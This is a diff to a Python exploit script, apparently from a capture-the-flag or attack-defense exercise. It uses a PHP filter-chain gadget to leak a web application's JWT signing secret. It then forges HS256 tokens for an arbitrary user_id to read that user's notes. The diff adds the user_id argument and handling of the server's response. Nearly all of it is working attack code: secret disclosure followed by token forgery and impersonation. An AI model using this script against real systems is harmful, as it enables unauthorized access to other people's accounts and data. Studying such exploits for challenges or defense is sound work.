@@ -3,6 +3,7 @@ import requests
 import bs4
 import jwt
 
+
 def get_secret(host):
     # https://github.com/synacktiv/php_filter_chain_generator
     # The following gadget chain will generate the following code : HOME=${SECRET}; (base64 value: SE9NRT0ke1NFQ1JFVH07)
@@ -14,24 +15,27 @@ def get_secret(host):
     soup = bs4.BeautifulSoup(response.content, 'html.parser')
     return soup.find('h1').text
 
-def get_notes(host, secret):
-    encoded = jwt.encode({'user_id': '1'}, secret, algorithm='HS256')
-    cookies = {
-            'language': 'en',
-            'jwt':encoded
-        }
-    response = requests.get(f"http://{host}/notes/", cookies=cookies)
-    soup = bs4.BeautifulSoup(response.content, 'html.parser')
+
+def get_notes(host, secret, user_id):
+    encoded = jwt.encode({'user_id': user_id}, secret, algorithm='HS256')
     notes = []
-    for note in soup.find('div', { 'id' : 'notes'}).findAll('div'):
-        notes.append({
-            "title": note.find("h2").text,
-            "description": note.find("p").text
-        })
+    cookies = {
+        'language': 'en',
+        'jwt': encoded
+    }
+    response = requests.get(f"http://{host}/notes/", cookies=cookies, allow_redirects=False)
+    if response.status_code == 200:
+        soup = bs4.BeautifulSoup(response.content, 'html.parser')
+        for note in soup.find('div', {'id': 'notes'}).findAll('div'):
+            notes.append({
+                "title": note.find("h2").text,
+                "description": note.find("p").text
+            })
     return notes
 
+
 if __name__ == "__main__":
-    host = sys.argv[1]
+    host, user_id = sys.argv[1], sys.argv[2]
     secret = get_secret(host)
-    notes = get_notes(host, secret)
+    notes = get_notes(host, secret, user_id)
     print(notes)
